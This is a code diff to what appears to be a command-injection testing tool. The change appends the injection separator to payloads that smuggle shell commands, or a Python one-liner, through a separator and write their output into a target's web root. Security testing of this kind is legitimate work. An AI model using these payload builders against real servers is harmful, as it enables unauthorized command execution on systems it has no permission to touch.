@@ -38,6 +38,9 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -56,6 +59,10 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
               settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
                )
 
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  # New line fixation
   if settings.USER_AGENT_INJECTION == True or \
      settings.REFERER_INJECTION == True or \
      settings.HOST_INJECTION == True or \
@@ -86,6 +93,10 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator +
               cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -110,6 +121,9 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
               settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
               settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or \
